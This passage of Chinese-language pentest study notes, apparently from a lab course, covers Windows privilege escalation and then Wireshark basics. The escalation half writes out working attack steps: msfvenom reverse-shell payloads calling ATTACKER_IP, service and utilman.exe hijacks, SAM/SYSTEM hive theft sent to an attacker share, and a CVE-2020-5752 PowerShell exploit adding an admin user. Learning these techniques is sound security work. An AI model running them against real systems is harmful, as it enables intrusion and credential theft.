plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><p>为了能够利用此漏洞，必须同时设置这两个参数。否则，将无法利用此漏洞。如果设置了这两个参数，则可以使用 生成恶意 .msi 文件 <code>msfvenom</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>由于这是一个反向 shell，您还应该运行相应配置的Metasploit Handler 模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><h4 id="windows服务错误配置">Windows服务错误配置</h4><p>Windows 服务由服务控制管理器(SCM)管理，每项服务都会有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件会实现特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每项服务还指定了运行服务的用户帐户。</p><p>我们使用<code>sc qc</code>命令检查服务配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc &lt;name&gt;</span><br></pre></td></tr></table></figure><blockquote><p>PowerShell 的“sc”是“Set-Content”的别名，因此如果您在PowerShell提示符中，则需要使用“sc.exe”来控制服务</p></blockquote><p>关联的可执行文件是通过<strong>BINARY_PATH_NAME</strong>参数指定的，而用于运行该服务的账户则显示在<strong>SERVICE_START_NAME</strong>参数上。</p><p>服务具有自主访问控制列表 (DACL)，它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。 DACL 可以从 Process Hacker中看到：</p><p>所有服务配置都存储在注册表中<code>HKLM\SYSTEM\CurrentControlSet\Services\</code></p><p>系统中每个服务都有一个子项。同样，我们可以在<strong>ImagePath</strong>值上看到关联的可执行文件，在<strong>ObjectName</strong>值上看到用于启动服务的帐户。如果为服务配置了DACL ，它将存储在名为<strong>Security</strong>的子项中。默认情况下只有管理员才能修改此类注册表项。</p><p><strong>服务可执行文件的权限不安全</strong></p><p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p><p>使用 msfvenom 生成一个 exe-service 有效负载并通过 python 网络服务器提供服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure><p>一旦有效载荷进入 Windows 服务器，我们将继续用我们的有效载荷替换服务可执行文件。由于我们需要另一个用户来执行我们的有效载荷，因此我们也需要向 Everyone 组授予完全权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move WService.exe WService.exe.bkp</span><br><span class="line">move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">icacls WService.exe /grant Everyone:F</span><br></pre></td></tr></table></figure><p><strong>未加引号的服务路径</strong></p><p>当我们无法像以前一样直接写入服务可执行文件时，如果将服务配置为指向“未加引号”(相关可执行文件的路径未正确加引号以考虑命令中的空格)的可执行文件，</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br></pre></td></tr></table></figure><p>此时由于命令中有空格，会产生歧义，SCM会依次搜索</p><p>1、<code>C:\\MyPrograms\\Disk.exe</code></p><p>2、<code>C:\\MyPrograms\\Disk Sorter.exe</code></p><p>3、<code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code></p><p>攻击者创建在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件，但大多数服务可执行文件将默认安装在<code>C:\Program Files</code>或下<code>C:\Program Files (x86)</code>，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则有例外：- 某些安装程序会更改已安装文件夹的权限，从而使服务易受攻击。- 管理员可能会决定将服务二进制文件安装在非默认路径中。如果这样的路径是所有人均可写的，则可以利用该漏洞。</p><p>依然用<code>icacls</code>查看文件夹权限，<strong>AD</strong>和<strong>WD</strong>权限，分别允许用户创建子目录和文件。</p><p>使用 msfvenom 创建 exe-service payload 并将其传输到目标主机的过程与之前相同</p><p><strong>不安全的服务权限</strong></p><p>如果服务 DACL（不是服务的可执行DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p><p>要从命令行检查服务 DACL，可以使用Sysinternals 套件中的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。具有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置该服务。</p><p>首先构建exe-service 反向 shell，授予每个人执行您的有效负载的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure><p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure><p>我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高权限帐户</p><h4 id="滥用危险特权">滥用危险特权</h4><p><strong>Windows权限</strong></p><p>特权是帐户执行特定系统相关任务的权利。每个用户都有一组分配的权限，可以使用以下命令进行检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才是值得关注的。您可以在<a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p><p>举例</p><p><strong>SeBackup/SeRestore</strong></p><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的DACL。</p><p>有了这种能力，攻击者就可以使用多种技术轻松提升系统权限，这里介绍复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p><p>1、以管理员身份打开命令提示符才能使用这些权限，备份 SAM 和 SYSTEM 哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">reg save hklm\sam C:\Users\THMBackup\sam.hive</span><br></pre></td></tr></table></figure><p>2、这将创建几个包含注册表配置单元内容的文件，可以使用 SMB 或任何其他可用方法将这些文件复制到我们的攻击者机器上。在攻击机使用<code>impacket</code>框架中<code>smbserver.py</code>脚本启动一个具有网络共享的简单SMB服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir share</span><br><span class="line">python3.9 /opt/impacket/examples/smbserver.py -smb2support -username &lt;username&gt; -password &lt;pass&gt; public share</span><br></pre></td></tr></table></figure><p>3、在目标机器使用<code>copy</code>将两个文件传输到攻击机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure><p>4、使用 impacket 检索用户的密码哈希值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure><p>5、最终可以使用管理员的哈希执行传递哈希攻击，并以 SYSTEM 权限访问目标机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/psexec.py -hashes</span><br></pre></td></tr></table></figure><p><strong>SeTakeOwnership</strong></p><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项</p><p>例如我们利用<code>utilman.exe</code>来提升权限。Utilman 是一款内置 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项，Utilman 以 SYSTEM 权限运行，因此如果我们将原始二进制文件替换为我们喜欢的任何有效载荷，我们将有效地获得 SYSTEM 权限。</p><p>1、为了替换 utilman，我们首先使用以下命令获取它的所有权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">takeown /f C:\Windows\System32\Utilman.exe</span><br></pre></td></tr></table></figure><blockquote><p>成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。</p></blockquote><p>2、授予用户对 utilman.exe 的完全权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br></pre></td></tr></table></figure><p>3、我们将用 cmd.exe 的副本替换 utilman.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe utilman.exe</span><br></pre></td></tr></table></figure><p>4、为了触发 utilman，我们将从开始按钮锁定屏幕，继续单击“轻松访问”按钮，它将以 SYSTEM 权限运行 cmd.exe</p><p><strong>SeImpersonate/SeAssignPrimaryToken</strong></p><p>这些权限允许进程模拟其他用户并代表他们行事，设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模仿任何连接和验证该进程的用户</p><h4 id="易受攻击的软件">易受攻击的软件</h4><p>可以使用该 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。以下命令将转储它可以收集的有关已安装软件的信息（可能需要大约一分钟才能完成）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure><p>该 <code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。始终值得检查桌面快捷方式、可用服务或通常任何表明可能存在其他易受攻击的软件的痕迹。</p><p>例如<code>CVE-2020-5752</code></p><p>更改脚本为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ErrorActionPreference = <span class="string">&quot;Stop&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">cmd = <span class="string">&quot;net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s = New-Object System.Net.Sockets.Socket(</span></span><br><span class="line">    [System.Net.Sockets.AddressFamily]::InterNetwork,</span><br><span class="line">    [System.Net.Sockets.SocketType]::Stream,</span><br><span class="line">    [System.Net.Sockets.ProtocolType]::Tcp</span><br><span class="line">)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s.Connect(<span class="string">&quot;127.0.0.1&quot;</span>, 6064)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">header = [System.Text.Encoding]::UTF8.GetBytes(<span class="string">&quot;inSync PHC RPCW[v0002]&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">rpcType = [System.Text.Encoding]::UTF8.GetBytes(<span class="string">&quot;<span class="subst">$([char]0x0005)</span>`0`0`0&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">command</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="string">&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <span class="variable">$cmd</span>&quot;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">length = [System.BitConverter]::GetBytes(<span class="variable">$command</span>.Length);</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s.Send(<span class="variable">$header</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s.Send(<span class="variable">$rpcType</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s.Send(<span class="variable">$length</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">s.Send(<span class="variable">$command</span>)</span></span><br></pre></td></tr></table></figure><p>在powershell ISE中运行， 这将创建<code>pwnd</code>密码为 的用户<code>SimplePass123</code>并将其添加到管理员组。使用以下命令来验证该用户<code>pwnd</code>是否存在并且属于管理员组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user pwnd</span><br></pre></td></tr></table></figure><h4 id="自动化工具">自动化工具</h4><p><strong>WinPEAS</strong>：WinPEAS 是一个脚本，用于枚举目标系统以发现特权提升路径。可下载预编译的可执行文件或 .bat 脚本，winPEAS 的输出可能很长，有时难以阅读。这就是为什么始终将输出重定向到文件是个好习惯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe &gt; outputfile.txt</span><br></pre></td></tr></table></figure><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a>下载。</p><p><strong>PrivescCheck</strong>：PowerShell脚本，无需执行二进制文件。</p><p><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck 可在此处</a>下载。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用Set-ExecutionPolicy如下所示的 cmdlet。</span></span><br><span class="line">Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">. .\PrivescCheck.ps1</span><br><span class="line">Invoke-PrivescCheck</span><br></pre></td></tr></table></figure><p><strong>WES-NG</strong>：无需上传到目标系统导致被杀软杀掉， WES-NG可在攻击机上运行，Python 脚本，可以<a href="https://github.com/bitsadmin/wesng">在此处</a>找到并下载。</p><p>安装后，在使用它之前，请输入命令 <code>wes.py --update</code>来更新数据库。该脚本将参考它创建的数据库来检查是否存在缺失的补丁，这些补丁可能会导致漏洞，您可以使用该漏洞来提升您在目标系统上的权限。</p><p>要使用该脚本，您需要<code>systeminfo</code> 在目标系统上运行该命令。不要忘记将输出定向到 .txt 文件，您需要将其移动到攻击机器上。</p><p>完成后，<a href="http://wes.py">wes.py</a> 可以按如下方式运行；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.py systeminfo.txt</span><br></pre></td></tr></table></figure><p><strong>Metasploit</strong></p><p>如果目标系统上已经有Meterpreter<code>multi/recon/local_exploit_suggester</code> shell，则可以使用该模块列出可能影响目标系统的漏洞，并允许您提升在目标系统上的权限。</p><h4 id="其他资源">其他资源</h4><ul><li>[PayloadsAllTheThings - Windows 权限提升](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Windows - Privilege <a href="http://Escalation.md">Escalation.md</a>)</li><li><a href="https://github.com/gtworek/Priv2Admin">Priv2Admin——滥用 Windows 权限</a></li><li><a href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM 漏洞</a></li><li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">土豆</a></li><li><a href="https://decoder.cloud/">解码器博客</a></li><li><a href="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf">代币绑架</a></li><li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">黑客技巧-Windows 本地权限提升</a></li></ul><h1>CompTIA Pentest+</h1><h2 id="工具-wireshark">工具-WireShark</h2><p>流量分析工具，用于</p><ul><li>检测并排除网络问题，例如网络负载故障点和拥塞。</li><li>检测安全异常，例如恶意主机、异常端口使用和可疑流量。</li><li>调查和了解协议细节，例如响应代码和有效负载数据。</li></ul><h3 id="gui">GUI</h3><p>主界面从上至下分为五个部分</p><table><thead><tr><th style="text-align:left"><strong>工具栏</strong></th><th>主工具栏包含用于数据包嗅探和处理的多个菜单和快捷方式，包括过滤、排序、汇总、导出和合并。</th></tr></thead><tbody><tr><td style="text-align:left"><strong>显示过滤栏</strong></td><td>主要查询和过滤部分。</td></tr><tr><td style="text-align:left"><strong>最近的文件</strong></td><td>最近调查的文件列表。您可以双击调用列出的文件。</td></tr><tr><td style="text-align:left"><strong>捕获过滤器和接口</strong></td><td>捕获过滤器和可用的嗅探点（网络接口）。网络接口是计算机和网络之间的连接点。软件连接（例如 lo、eth0 和 ens33）可启用联网硬件。</td></tr><tr><td style="text-align:left"><strong>状态栏</strong></td><td>工具状态、配置文件和数字包信息。</td></tr></tbody></table><p><strong>加载pacp文件</strong></p><p>可加载<code>.cap</code>、<code>.pcapng</code>等pcap文件，流量分析界面包括</p><table><thead><tr><th><strong>数据包列表窗格</strong></th><th>每个数据包的摘要（源地址和目标地址、协议和数据包信息）。可以单击列表选择一个数据包进行进一步调查。选择数据包后，详细信息将显示在其他面板中。</th></tr></thead><tbody><tr><td><strong>数据包详细信息窗格</strong></td><td>所选数据包的详细协议细分。</td></tr><tr><td><strong>数据包字节窗格</strong></td><td>所选数据包的十六进制和解码后的 ASCII 表示。它会根据详细信息窗格中单击的部分突出显示数据包字段。</td></tr></tbody></table><blockquote><p>状态栏中可显示数据包总数、文件名等</p></blockquote><p><strong>着色包</strong></p><p>Wireshark 根据不同的条件和协议对数据包进行着色，以便快速发现捕获中的异常和协议，可以使用显示过滤器创建自定义颜色规则，默认的颜色可在<strong>视图-&gt;着色规则</strong>中查看</p><p><strong>流量嗅探</strong></p><p>可以使用左上角鲨鱼图标启动网络嗅探（捕获流量）,红色按钮将停止嗅探，绿色按钮将重新启动嗅探过程。状态栏还将提供使用的嗅探接口和收集到的数据包数量。</p><p><strong>合并PCAP文件</strong></p><p>在<strong>文件-&gt;合并</strong>路径将 pcap 与已处理的文件合并。当您选择第二个文件时，Wireshark 将显示所选文件中的数据包总数。单击“打开”后，它会将现有 pcap 文件与所选文件合并并创建一个新的 pcap 文件。</p><p><strong>查看文件详细信息</strong></p><p>了解文件详细信息很有帮助。尤其是在处理多个 pcap 文件时，有时需要了解并调用文件详细信息（文件哈希、捕获时间、捕获文件注释、接口和统计信息）来识别文件、对其进行分类和优先排序。您可以通过以下方式查看详细信息：“<strong>统计 --&gt; 捕获文件属性”</strong> 或单击 窗口 <strong>左下角的“pcap 图标” 。</strong></p><h3 id="数据包">数据包</h3><p>Wireshark 支持解析大量协议，您还可以编写自己的解析脚本。可以<a href="https://github.com/boundary/wireshark/blob/master/doc/README.dissector"><strong>在此处</strong></a>找到有关解析的更多详细信息。</p><p>根据 OSI 模型，数据包由 5 到 7 层组成</p><p><strong>帧</strong>（第一层）：显示您正在查看的帧/数据包以及特定于 OSI 模型物理层的详细信息</p><p><strong>源 [MAC]</strong>（第二层）：显示来自 OSI 模型数据链路层的源和目标 MAC 地址</p><p><strong>源 [IP]</strong>（第三层）：显示来自 OSI 模型网络层的源和目标 IPv4 地址</p><p><strong>协议</strong>（第四层）：显示所使用的协议（UDP / TCP）以及源端口和目标端口的详细信息；来自 OSI 模型的传输层。</p><p><strong>协议错误</strong>：第 4 层的延续显示需要重新组装的TCP特定段</p><p><strong>应用程序协议</strong>（第五层）：显示所用协议的特定详细信息，例如HTTP、FTP和SMB。来自 OSI 模型的应用程序层。</p><p><strong>应用程序数据：</strong> 第五层的扩展可以显示特定于应用程序的数据</p><h4 id="分组导航">分组导航</h4><p>Wireshark 计算所调查数据包的数量并为每个数据包分配一个唯一编号，可使用<code>转到-&gt;转至分组</code>加编号转到特定数据包</p><blockquote><p>快捷键<code>ctrl+g</code></p></blockquote><p><strong>查找数据包</strong></p><p>Wireshark 还可以通过数据包内容查找数据包，通过<code>编辑-&gt;查找分组</code>，接受四种类型的输入（显示过滤器、十六进制、字符串和正则表达式）。字符串和正则表达式搜索是最常用的搜索类型。搜索不区分大小写，但可以通过单击单选按钮在搜索中设置区分大小写。</p><p>第二点是选择搜索字段。您可以在三个窗格（数据包列表、数据包详细信息和数据包字节）中进行搜索</p><p><strong>标记数据包</strong></p><p>可以帮助分析师指出感兴趣的事件或从捕获中导出特定数据包。 您可以使用**“编辑”**或 “右键单击”菜单来标记/取消标记数据包。</p><p>标记的数据包将显示为黑色，无论原始颜色代表什么连接类型。请注意，标记的数据包信息在每个文件会话中都会更新，因此关闭捕获文件后标记的数据包将丢失。</p><p><strong>数据包注释</strong></p><p>为特定数据包添加注释，这将有助于进一步调查或提醒并指出其他层分析师的重要/可疑点。与数据包标记不同，注释可以保留在捕获文件中，直到操作员将其删除。</p><p><strong>导出数据包</strong></p><p>使用<code>文件-&gt; 导出特定分组</code></p><p>Wireshark 可以提取通过网络传输的文件，发现共享文件并保存以供进一步调查至关重要。导出对象仅适用于选定协议的流（DICOM、HTTP、IMF、SMB和 TFTP）。</p><p>Wireshark 会列出捕获的数据包，默认以“自捕获开始以来的秒数”显示时间，常见用法是使用 UTC 时间显示格式以获得更好的视图。您可以使用 <strong>“视图 --&gt; 时间显示格式”</strong> 菜单来更改时间显示格式。</p><p><strong>专家信息</strong></p><p>Wireshark 还可以检测协议的特定状态，存在误报/漏报的可能性</p><table><thead><tr><th><strong>Colour</strong></th><th><strong>Info</strong></th></tr></thead><tbody><tr><td>Chat</td><td>有关通常工作流程的信息。</td></tr><tr><td>Note</td><td>值得注意的事件，例如应用程序错误代码</td></tr><tr><td>Warn</td><td>黄色</td></tr><tr><td>Error</td><td>红色</td></tr></tbody></table><p>常遇信息</p><table><thead><tr><th><strong>Group</strong></th><th><strong>Info</strong></th><th><strong>Group</strong></th><th><strong>Info</strong></th></tr></thead><tbody><tr><td><strong>Checksum</strong></td><td>校验和错误</td><td><strong>Deprecated</strong></td><td>弃用协议使用</td></tr><tr><td><strong>Comment</strong></td><td>数据包注释检测</td><td><strong>Malformed</strong></td><td>畸形数据包检测</td></tr></tbody></table><p>使用状态栏中的**“左下角”或“分析 --&gt; 专家信息”**菜单通过对话框查看所有可用的信息条目。它将显示数据包编号、摘要、组协议和总发生次数。</p><h4 id="数据包过滤">数据包过滤</h4><p>Wireshark 有两种过滤方法：捕获过滤器和显示过滤器。捕获过滤器用于 仅“捕获”对所用过滤器有效的数据包。显示过滤器用于 “查看”对所用过滤器有效的数据包。</p><p>Wireshark 提供了强大的GUI，对于不想为基本任务编写查询的分析师来说，有一条黄金法则： <strong>“如果您可以单击它，您就可以过滤和复制它”</strong> 。</p><p><strong>应用为过滤器</strong></p><p>这是过滤流量的最基本方法。在调查捕获文件时，您可以单击要过滤的字段，然后使用 “右键菜单”或 <strong>“分析</strong> <strong>–&gt; 应用为过滤器”</strong> 菜单来过滤特定值。应用过滤器后，Wireshark 将生成所需的过滤器查询，应用它，根据您的选择显示数据包，并从数据包列表窗格中隐藏未选择的数据包。请注意，总数据包数和显示的数据包数始终显示在状态栏上。</p><p><strong>对话过滤器</strong></p><p>当您使用“应用为过滤器”选项时，您将仅过滤数据包的单个实体。此选项是调查数据包中特定值的好方法。但是，假设您想通过关注 IP 地址和端口号来调查特定数据包编号和所有链接数据包。在这种情况下，“对话过滤器”选项可帮助您仅查看相关数据包并轻松隐藏其余数据包。您可以使用“右键菜单”或“<strong>分析 --&gt; 对话过滤器</strong>”菜单来过滤对话。</p><p><strong>着色对话</strong></p><p>与“对话过滤器”类似，但有一个区别。它突出显示链接的数据包而不应用显示过滤器并减少查看的数据包数量。此选项与“着色规则”选项配合使用，可更改数据包颜色而不考虑先前应用的颜色规则。您可以使用 “右键菜单”或**“查看 --&gt; 着色对话”**菜单单击即可为链接的数据包着色。请注意，您可以使用 <strong>“查看 --&gt; 着色对话 --&gt; 重置着色”</strong> 菜单撤消此操作。</p><p><strong>准备过滤器</strong></p><p>使用“右键单击”菜单创建显示过滤器。但是，与前一个模型不同，此模型不会在选择后应用过滤器。它会将所需的查询添加到窗格中，并等待执行</p><p><strong>申请为列</strong></p><p>可以使用 “右键菜单” 或 <strong>“分析 *<em>–&gt;*</em> 应用为列”</strong> 菜单将列添加到数据包列表窗格。 单击某个值并将其应用为列后，它将显示在数据包列表窗格中。可以通过单击数据包列表窗格顶部来启用/禁用数据包列表窗格中显示的列。</p><p><strong>追踪流</strong></p><p>Wireshark 以数据包部分大小显示所有内容。但是，可以重建流并查看应用程序级别呈现的原始流量。根据协议，流可帮助分析师重建应用程序级数据并了解感兴趣的事件。还可以查看未加密的协议数据，如用户名、密码和其他传输的数据。</p><p>可以使用“右键菜单”或 <strong>“分析</strong> <strong>–&gt; 跟踪 TCP/UDP/HTTP 流”</strong> 菜单来跟踪流量流。流量显示在单独的对话框中；来自服务器的数据包以蓝色突出显示，来自客户端的数据包以红色突出显示。</p><p>一旦您跟踪某个流，Wireshark 就会自动创建并应用所需的过滤器来查看特定流。请记住，一旦应用过滤器，查看的数据包数量就会发生变化。您需要使用显示过滤器栏右上方的 “ <strong>X</strong> 按钮”来删除显示过滤器并查看捕获文件中所有可用的数据包。</p><h3 id="高级数据包操作">高级数据包操作</h3><p><strong>统计数据</strong></p><p>提供了多个可供调查的统计选项，以帮助用户了解流量范围、可用协议、端点和对话以及某些协议特定详细信息（如 DHCP、DNS 和HTTP /2）的总体情况。</p><ul><li>已解析的地址</li></ul><p>通过提供已解析地址及其主机名的列表，帮助识别捕获文件中可用的IP 地址和DNS名称。请注意，主机名信息取自捕获文件中的DNS信息。分析师可以使用此菜单快速识别访问的资源。因此，他们可以发现访问的资源并根据感兴趣的事件对其进行评估。您可以使用 <strong>“统计 --&gt; 已解析地址”</strong> 菜单查看 Wireshark 解析的所有地址。</p><ul><li>协议分级</li></ul><p>细分捕获文件中所有可用的协议，并帮助根据数据包计数器和百分比以树状视图查看协议。因此，可以查看端口和服务的总体使用情况，并专注于感兴趣的事件。上面提到的黄金法依然有效；可以右键单击并过滤感兴趣的事件。您可以使用 <strong>“统计信息 --&gt; 协议分级”</strong> 菜单查看此信息。</p><ul><li>会话</li></ul><p>表示两个特定端点之间的流量。提供五种基本格式的对话列表：以太网、IPv4、IPv6、TCP 和 UDP。因此，可以识别所有对话并联系相关事件的端点。 您可以使用 <strong>“统计 --&gt; 会话”</strong> 菜单查看此信息。</p><ul><li>端点</li></ul><p>与会话选项类似。唯一的区别是此选项为单个信息字段（以太网、IPv4、IPv6、TCP 和 UDP）提供唯一信息。因此，分析师可以识别捕获文件中的唯一端点并将其用于感兴趣的事件。 您可以使用 <strong>“统计 --&gt; 端点”</strong> 菜单查看此信息。</p><p>Wireshark 还支持使用 IEEE 指定的制造商名称将 MAC 地址解析为人性化格式。请注意，此转换是通过 MAC 地址的前三个字节完成的，并且仅适用于已知制造商。查看以太网端点时，可以使用端点窗口左下角的**“名称解析”按钮**激活此选项。</p><ul><li>IPV4和IPV6</li></ul><p>统计信息菜单有两个选项，用于缩小包含特定 IP 版本的数据包的统计信息。因此，可以在一个窗口中识别和列出与特定 IP 版本相关的所有事件，并将其用于感兴趣的事件。您可以使用 <strong>“统计信息 --&gt; IPvX 统计信息”</strong> 菜单查看此信息。</p><ul><li>DNS</li></ul><p>此选项会分解捕获文件中的所有 DNS 数据包，并帮助分析师根据数据包计数器和 DNS 协议百分比以树状视图查看结果。因此，分析师可以查看 DNS 服务的整体使用情况，包括 rcode、opcode、类、查询类型、服务和查询统计信息，并将其用于感兴趣的事件。您可以使用 <strong>“统计信息 --&gt; DNS”</strong> 菜单查看此信息。</p><ul><li>HTTP</li></ul><p>此选项会细分捕获文件中的所有 HTTP 数据包，并帮助分析师根据数据包计数器和 HTTP 